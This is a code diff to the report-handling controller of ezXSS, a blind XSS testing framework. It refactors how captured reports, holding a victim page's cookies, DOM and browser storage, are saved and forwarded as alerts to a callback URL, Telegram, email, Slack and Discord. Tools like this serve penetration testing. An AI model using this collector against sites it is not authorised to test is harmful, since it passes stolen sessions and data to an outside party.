@@ -157,7 +157,7 @@ class Payloads extends Controller
 
             // Save the report
             $shareId = sha1(bin2hex(openssl_random_pseudo_bytes(32)) . time());
-            $report = $this->model('Report')->add(
+            $data->id = $this->model('Report')->add(
                 $shareId,
                 $data->cookies,
                 $data->dom,
@@ -171,6 +171,9 @@ class Payloads extends Controller
                 json_encode($data->sessionstorage),
                 $data->payload
             );
+            $data->domain = e($_SERVER['HTTP_HOST']);
+            $data->time = time();
+            $data->timestamp = date("c", strtotime("now"));
 
             // Send out alerts
             if (($doubleReport && $this->model('Setting')->get('filter-alert') == 1) || (!$doubleReport)) {
@@ -266,56 +269,74 @@ class Payloads extends Controller
 
     private function callbackAlert($data)
     {
+        // Send alert to custom callback url
         $url = (parse_url($this->model('Setting')->get('callback-url'), PHP_URL_SCHEME) ? '' : 'https://') . $this->model('Setting')->get('callback-url');
-        $cb = curl_init($url);
-        curl_setopt($cb, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
-        curl_setopt($cb, CURLOPT_FOLLOWLOCATION, false);
-        curl_setopt($cb, CURLOPT_TIMEOUT, 20);
-        curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
-        curl_setopt($cb, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
-        curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_exec($cb);
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_exec($ch);
     }
 
     private function telegramAlert($data, $bottoken, $chatid)
     {
         if (!empty($data->screenshot)) {
-            $data->screenshot = 'https://' . e($_SERVER['HTTP_HOST']) . "/assets/img/report-{$data->screenshotName}.png";
+            $data->screenshot = "https://{$data->domain}/assets/img/report-{$data->screenshotName}.png";
         }
 
-        $markdownTemplate = 'test';
+        // Create Telegram alert template
+        $alertTemplate = $this->view->getAlert('telegram.md');
+        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);
 
-        $cb = curl_init("https://api.telegram.org/bot{$bottoken}/sendMessage");
-        curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
-        curl_setopt($cb, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatid, 'parse_mode' => 'markdown', 'text' => $markdownTemplate]));
-        curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_exec($cb);
+        // Send alert to telegram bot API
+        $ch = curl_init("https://api.telegram.org/bot{$bottoken}/sendMessage");
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatid, 'parse_mode' => 'markdown', 'disable_web_page_preview' => false, 'text' => $alertTemplate]));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_exec($ch);
     }
 
     private function mailAlert($data, $email)
     {
         if (!empty($data->screenshot)) {
-            $data->screenshot = '<img style="max-width: 100%;" src="https://' . e($_SERVER['HTTP_HOST']) . "/assets/img/report-{$data->screenshotName}.png\">";
+            $data->screenshot = "<img style=\"max-width:100%;\" src=\"https://{$data->domain}/assets/img/report-{$data->screenshotName}.png\">";
         }
 
-        $htmlTemplate = '';
+        // Create mail alert template
+        $alertTemplate = $this->view->getAlert('mail.html');
+        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);
 
         $headers[] = 'From: ezXSS';
         $headers[] = 'MIME-Version: 1.0';
         $headers[] = 'Content-type: text/html; charset=iso-8859-1';
         mail(
             $email,
-            '[ezXSS] XSS on ' . htmlspecialchars($data->uri),
-            $htmlTemplate,
+            '[ezXSS] XSS on ' . e($data->uri),
+            $alertTemplate,
             implode("\r\n", $headers)
         );
     }
 
     private function slackAlert($data, $webhookURL)
     {
-        //todo
+        // Create Slack alert template
+        $alertTemplate = $this->view->getAlert('slack.md');
+        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);
+
+        // Send alert to Slack webhook
+        $ch = curl_init($webhookURL);
+        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['type' => 'mrkdwn', 'text' => $alertTemplate]));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_exec($ch);
     }
 
     private function discordAlert($data, $webhookURL)
@@ -324,59 +345,15 @@ class Payloads extends Controller
             $data->screenshot = 'https://' . e($_SERVER['HTTP_HOST']) . "/assets/img/report-{$data->screenshotName}.png";
         }
 
-        $discordMessage = json_encode([
-            "username" => "ezXSS",
-            "embeds" => [
-                [
-                    "title" => '[ezXSS] XSS on ' . substr($data->uri, 0, 200),
-                    "type" => "rich",
-                    "url" => "https://example.com/manage/reports/view/1",
-                    "timestamp" => date("c", strtotime("now")),
-                    "color" => hexdec("2b3157"),
-                    "fields" => [
-                        [
-                            "name" => 'URL',
-                            "value" => substr(!empty($data->uri) ? $data->uri : 'None', 0, 1024)
-                        ],
-                        [
-                            "name" => 'IP',
-                            "value" => substr(!empty($data->ip) ? $data->ip : 'None', 0, 1024)
-                        ],
-                        [
-                            "name" => 'Referer',
-                            "value" => substr(!empty($data->referer) ? $data->referer : 'None', 0, 1024)
-                        ],
-                        [
-                            "name" => 'Payload',
-                            "value" => substr(!empty($data->payload) ? $data->payload : 'None', 0, 1024)
-                        ],
-                        [
-                            "name" => 'User Agent',
-                            "value" => substr(!empty($data->{'user-agent'}) ? $data->{'user-agent'} : 'None', 0, 1024)
-                        ],
-                        [
-                            "name" => 'Cookies',
-                            "value" => substr(!empty($data->cookies) ? $data->cookies : 'None', 0, 1024)
-                        ],
-                        [
-                            "name" => 'Origin',
-                            "value" => substr(!empty($data->origin) ? $data->origin : 'None', 0, 1024)
-                        ]
-                    ],
-                    "image" => [
-                        "url" => !empty($data->screenshot) ? $data->screenshot : ''
-                    ],
-                    "footer" => [
-                        "text" => "github.com/ssl/ezXSS"
-                    ]
-                ]
-            ]
+        // Create Discord alert template
+        $alertTemplate = $this->view->getAlert('discord.json');
+        $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);
+        $discordMessage = json_encode(json_decode($alertTemplate), JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
 
-        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
-
+        // Send alert to Discord webhook
         $ch = curl_init($webhookURL);
         curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
+        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $discordMessage);
